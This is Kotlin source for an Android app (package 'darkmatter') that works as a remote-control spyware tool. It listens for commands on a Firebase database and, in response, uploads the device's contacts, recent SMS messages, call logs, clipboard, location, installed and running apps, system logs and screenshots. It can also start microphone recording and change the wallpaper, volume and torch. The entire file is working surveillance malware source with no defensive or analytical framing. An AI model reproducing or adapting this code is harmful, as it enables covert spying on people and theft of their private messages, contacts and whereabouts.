package com.my.darkmatter

import android.Manifest
import android.annotation.SuppressLint
import android.app.ActivityManager
import android.app.KeyguardManager
import android.app.WallpaperManager
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.Canvas
import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraManager
import android.media.AudioManager
import android.media.MediaRecorder
import android.net.Uri
import android.net.wifi.WifiManager
import android.os.*
import android.provider.CalendarContract
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Telephony
import android.provider.Settings
import android.text.format.Formatter
import android.util.Log
import android.view.View
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import com.google.firebase.database.*
import com.google.firebase.storage.FirebaseStorage
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationServices
import com.google.firebase.database.DatabaseReference
import java.io.File
import java.io.FileOutputStream
import java.io.IOException

class MainActivity : AppCompatActivity() {

    private lateinit var commandTextView: TextView
    private lateinit var database: DatabaseReference
    private lateinit var storage: FirebaseStorage
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private lateinit var vibrator: Vibrator
    private lateinit var clipboardManager: ClipboardManager
    private lateinit var mediaRecorder: MediaRecorder
    private lateinit var cameraManager: CameraManager
    private var isRecording = false
    private var isTorchOn = false
    private val PERMISSION_REQUEST_CODE = 1001
    private val audioFileName = "recording.mp3"
    private val deviceName = Build.MODEL

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Initialize components
        initializeComponents()

        // Request permissions
        requestPermissions()

        // Set device status as online
        updateDeviceStatus(true)

        // Listen for Firebase commands
        listenForCommands()
    }

    override fun onResume() {
        super.onResume()
        updateDeviceStatus(true)
    }

    override fun onPause() {
        super.onPause()
        updateDeviceStatus(false)
    }

    private fun initializeComponents() {
        commandTextView = findViewById(R.id.commandTextView)
        database = FirebaseDatabase.getInstance().reference.child("Device")
        storage = FirebaseStorage.getInstance()
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        vibrator = getSystemService(Vibrator::class.java)
        clipboardManager = getSystemService(CLIPBOARD_SERVICE) as ClipboardManager
        cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
    }

    private fun requestPermissions() {
        ActivityCompat.requestPermissions(this,
            arrayOf(
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.CAMERA
            ),
            PERMISSION_REQUEST_CODE
        )
    }

    private fun updateDeviceStatus(isOnline: Boolean) {
        val statusRef = database.child(deviceName).child("status")
        statusRef.setValue(if (isOnline) "online" else "offline")
        if (isOnline) statusRef.onDisconnect().setValue("offline")
    }

    private fun listenForCommands() {
        database.child("command").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val commandValue = snapshot.getValue(String::class.java)
                commandTextView.text = commandValue ?: "No command available"

                when (commandValue) {
                    "battery" -> sendBatteryStatus()
                    "contacts" -> sendContacts()
                    "location" -> sendLocation()
                    "vibrate" -> vibrateDevice()
                    "clipboard" -> sendClipboardData()
                    "messages" -> sendMessages()
                    "record" -> startRecording()
                    "call_logs" -> sendCallLogs()
                    "torch_on" -> turnOnTorch()
                    "torch_off" -> turnOffTorch()
                    "screenshot" -> takeScreenshot()
                    "device_info" -> sendDeviceInfo()
                    "wallpaper" -> changeWallpaper()
                    "mute_volume" -> muteVolume()
                    "unmute_volume" -> unmuteVolume()
                    "set_volume" -> setVolumeLevel(5) // Set volume to 5 as an example
                    "send_running_apps" -> getActiveApps()
                    "send_system_logs" -> sendSystemLogs()
                    "send_installed_apps" -> sendInstalledApps()

                    else -> commandTextView.append("\nUnknown command")
                }
            }

            override fun onCancelled(error: DatabaseError) {
                commandTextView.text = "Error fetching command: ${error.message}"
            }
        })
    }

    private fun sendBatteryStatus() {
        val batteryIntent: Intent? = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
        val batteryLevel = if (level >= 0 && scale > 0) (level * 100) / scale else -1

        database.child(deviceName).child("battery_status").child("level").setValue(batteryLevel)
            .addOnCompleteListener {
                commandTextView.append("\nBattery status sent: $batteryLevel%")
            }
    }

    @SuppressLint("Range")
    private fun sendContacts() {
        val contactsList = mutableListOf<Map<String, String>>()
        val cursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)

        cursor?.use {
            while (it.moveToNext()) {
                val name = it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val number = it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                contactsList.add(mapOf("name" to name, "number" to number))
            }
        }

        database.child(deviceName).child("contacts").setValue(contactsList)
            .addOnCompleteListener {
                commandTextView.append("\nContacts sent successfully.")
            }
    }

    @SuppressLint("MissingPermission")
    private fun sendLocation() {
        fusedLocationClient.lastLocation.addOnSuccessListener { location ->
            location?.let {
                val locationData = mapOf("latitude" to it.latitude, "longitude" to it.longitude)
                database.child(deviceName).child("location").setValue(locationData)
                    .addOnCompleteListener {
                        commandTextView.append("\nLocation sent successfully.")
                    }
            } ?: commandTextView.append("\nFailed to fetch location.")
        }
    }

    private fun vibrateDevice() {
        vibrator.vibrate(2000)
        commandTextView.append("\nDevice vibrated.")
    }

    private fun sendClipboardData() {
        val clipboardText = clipboardManager.primaryClip?.getItemAt(0)?.text?.toString() ?: "No clipboard data"
        database.child(deviceName).child("clipboard").setValue(clipboardText)
            .addOnCompleteListener {
                commandTextView.append("\nClipboard data sent successfully.")
            }
    }

    @SuppressLint("Range")
    private fun sendMessages() {
        val messagesList = mutableListOf<Map<String, String>>()
        val cursor = contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, Telephony.Sms.DEFAULT_SORT_ORDER)

        cursor?.use {
            var count = 0
            while (it.moveToNext() && count < 10) {
                val address = it.getString(it.getColumnIndex(Telephony.Sms.ADDRESS)) ?: "Unknown"
                val body = it.getString(it.getColumnIndex(Telephony.Sms.BODY)) ?: "No message"
                messagesList.add(mapOf("address" to address, "body" to body))
                count++
            }
        }

        database.child(deviceName).child("messages").setValue(messagesList)
            .addOnCompleteListener {
                commandTextView.append("\nMessages sent successfully.")
            }
    }

    @SuppressLint("Range")
    private fun sendCallLogs() {
        val callLogs = mutableListOf<Map<String, String>>()
        val cursor = contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DEFAULT_SORT_ORDER)

        cursor?.use {
            var count = 0
            while (it.moveToNext() && count < 10) {
                val number = it.getString(it.getColumnIndex(CallLog.Calls.NUMBER)) ?: "Unknown"
                val type = it.getString(it.getColumnIndex(CallLog.Calls.TYPE)) ?: "Unknown"
                callLogs.add(mapOf("number" to number, "type" to type))
                count++
            }
        }

        database.child(deviceName).child("call_logs").setValue(callLogs)
            .addOnCompleteListener {
                commandTextView.append("\nCall logs sent successfully.")
            }
    }

    private fun startRecording() {
        if (isRecording) return

        mediaRecorder = MediaRecorder().apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            val audioFile = File(getExternalFilesDir(null), audioFileName)
            setOutputFile(audioFile.absolutePath)
            prepare()
            start()
        }
        isRecording = true
        commandTextView.append("\nRecording started.")
    }

    private fun stopRecording() {
        if (!isRecording) return

        mediaRecorder.apply {
            stop()
            release()
        }
        isRecording = false
        commandTextView.append("\nRecording stopped.")
    }

    private fun turnOnTorch() {
        try {
            cameraManager.setTorchMode(cameraManager.cameraIdList[0], true)
            isTorchOn = true
            commandTextView.append("\nTorch turned on.")
        } catch (e: CameraAccessException) {
            commandTextView.append("\nFailed to turn on torch: ${e.message}")
        }
    }

    private fun turnOffTorch() {
        try {
            cameraManager.setTorchMode(cameraManager.cameraIdList[0], false)
            isTorchOn = false
            commandTextView.append("\nTorch turned off.")
        } catch (e: CameraAccessException) {
            commandTextView.append("\nFailed to turn off torch: ${e.message}")
        }
    }

    private fun takeScreenshot() {
        try {
            val rootView = window.decorView.findViewById<View>(android.R.id.content)
            val bitmap = Bitmap.createBitmap(rootView.width, rootView.height, Bitmap.Config.ARGB_8888)
            val canvas = Canvas(bitmap)
            rootView.draw(canvas)

            val file = File(getExternalFilesDir(null), "screenshot.png")
            val outputStream = FileOutputStream(file)
            bitmap.compress(Bitmap.CompressFormat.PNG, 100, outputStream)
            outputStream.close()

            uploadFile(file, "screenshot.png")
            commandTextView.append("\nScreenshot taken.")
        } catch (e: Exception) {
            commandTextView.append("\nFailed to take screenshot: ${e.message}")
        }
    }

    private fun uploadFile(file: File, fileName: String) {
        val storageRef = storage.reference.child(deviceName).child(fileName)
        val fileUri = Uri.fromFile(file)
        storageRef.putFile(fileUri).addOnCompleteListener {
            if (it.isSuccessful) {
                commandTextView.append("\nFile uploaded successfully: $fileName")
            } else {
                commandTextView.append("\nFailed to upload file: $fileName")
            }
        }
    }

    private fun sendDeviceInfo() {
        val deviceInfo = mapOf(
            "device_model" to Build.MODEL,
            "os_version" to Build.VERSION.RELEASE,
            "sdk_version" to Build.VERSION.SDK_INT,
            "storage" to getStorageInfo()
        )

        database.child(deviceName).child("device_info").setValue(deviceInfo)
            .addOnCompleteListener {
                commandTextView.append("\nDevice information sent.")
            }
    }

    private fun getStorageInfo(): String {
        val stat = StatFs(Environment.getDataDirectory().absolutePath)
        val totalBytes = stat.blockCountLong * stat.blockSizeLong
        val availableBytes = stat.availableBlocksLong * stat.blockSizeLong
        val usedBytes = totalBytes - availableBytes
        return "Total: ${formatBytes(totalBytes)}, Used: ${formatBytes(usedBytes)}, Free: ${formatBytes(availableBytes)}"
    }

    private fun formatBytes(bytes: Long): String {
        val kb = 1024
        val mb = kb * 1024
        val gb = mb * 1024

        return when {
            bytes >= gb -> "${bytes / gb} GB"
            bytes >= mb -> "${bytes / mb} MB"
            bytes >= kb -> "${bytes / kb} KB"
            else -> "$bytes Bytes"
        }
    }

    private fun changeWallpaper() {
        try {
            val wallpaperManager = WallpaperManager.getInstance(this)
            val bitmap = BitmapFactory.decodeResource(resources, R.drawable.wallpaper)
            wallpaperManager.setBitmap(bitmap)
            commandTextView.append("\nWallpaper changed.")
        } catch (e: Exception) {
            commandTextView.append("\nFailed to change wallpaper: ${e.message}")
        }
    }


    private fun muteVolume() {
        val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, 0, 0)
        commandTextView.append("\nVolume muted.")
    }

    private fun unmuteVolume() {
        val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, 5, 0)
        commandTextView.append("\nVolume unmuted.")
    }

    private fun setVolumeLevel(level: Int) {
        val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, level, 0)
        commandTextView.append("\nVolume set to $level.")
    }







    private fun getActiveApps() {
        val activityManager = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        val runningApps = activityManager.runningAppProcesses
        val appNames = runningApps?.map { it.processName } ?: emptyList()

        database.child(deviceName).child("running_apps").setValue(appNames)
            .addOnCompleteListener {
                commandTextView.append("\nRunning apps sent.")
            }
    }

    private fun sendSystemLogs() {
        try {
            val logFile = File(filesDir, "system_log.txt")
            val process = Runtime.getRuntime().exec("logcat -d")
            val inputStream = process.inputStream
            val outputStream = FileOutputStream(logFile)

            inputStream.copyTo(outputStream)
            outputStream.close()

            uploadFile(logFile, "system_log.txt")
            commandTextView.append("\nSystem logs sent.")
        } catch (e: Exception) {
            commandTextView.append("\nFailed to collect logs: ${e.message}")
        }
    }

    private fun sendInstalledApps() {
        val packageManager = packageManager
        val appsList = mutableListOf<Map<String, String>>()

        val installedApps = packageManager.getInstalledApplications(PackageManager.GET_META_DATA)
        for (app in installedApps) {
            val appName = packageManager.getApplicationLabel(app).toString()
            val version = packageManager.getPackageInfo(app.packageName, 0).versionName
            appsList.add(mapOf("app_name" to appName, "version" to version))
        }

        database.child(deviceName).child("installed_apps").setValue(appsList)
            .addOnCompleteListener {
                commandTextView.append("\nInstalled apps list sent.")
            }
    }


}
